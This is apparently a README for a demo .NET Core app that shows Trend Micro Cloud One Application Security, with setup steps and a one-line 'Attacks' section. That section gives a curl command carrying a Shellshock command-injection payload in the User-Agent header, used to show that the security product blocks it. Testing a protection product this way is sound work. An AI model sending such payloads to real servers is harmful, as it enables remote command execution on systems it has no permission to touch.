# Cloud One Application Security with dotNET Core

- [Cloud One Application Security with dotNET Core](#cloud-one-application-security-with-dotnet-core)
  - [Usage](#usage)
  - [Attacks](#attacks)
  - [Support](#support)
  - [Contribute](#contribute)

This demo app for Cloud One Application Security uses a simple dotNET demo app based on @Microsoft <https://github.com/dotnet/dotnet-docker/tree/main/samples/aspnetapp>. The app does not support any interaction, but you can shellshock it to proove, that Application Security does it's job.

Application Security integration done via the provided Dockerfile

## Usage

First, clone the repo

```sh
$ git clone https://github.com/mawinkler/c1-app-sec-dotnet.git
```

Now, set your Application Security keys

```sh
$ # YOUR KEYS HERE
$ export APPSEC_KEY=<your key>
$ export APPSEC_SECRET=<your secret>
$ # YOUR DOCKER HUB USERNAME (required for deploy.sh only)
$ export DOCKER_USERNAME=<your username>
$ # DESIRED DOTNET VERSION
$ export DOTNET_VERSION=5.0
```

Eventually, if your Cloud One V2 account is NOT running in `us-1` you need to adapt the hello_url in the `TrendAppProtect.config`.

Then build and run the container, which you can do by running

```sh
$ # Run app on your local docker engine
$ # Requires docker-compose
$ ./run.sh

$ # Deploy app with a loadbalancer service on your current kubernetes context
$ ./deploy.sh
```

The app is accessible on port 5000.

## Attacks

```sh
curl -H "User-Agent: () { :; }; /bin/eject" http://<IP>:80/
```

## Support

This is an Open Source community project. Project contributors may be able to help, depending on their time and availability. Please be specific about what you're trying to do, your system, and steps to reproduce the problem.

For bug reports or feature requests, please [open an issue](../../issues). You are welcome to [contribute](#contribute).

Official support from Trend Micro is not available. Individual contributors may be Trend Micro employees, but are not official support.

## Contribute

I do accept contributions from the community. To submit changes:

1. Fork this repository.
1. Create a new feature branch.
1. Make your changes.
1. Submit a pull request with an explanation of your changes or additions.

I will review and work with you to release the code.
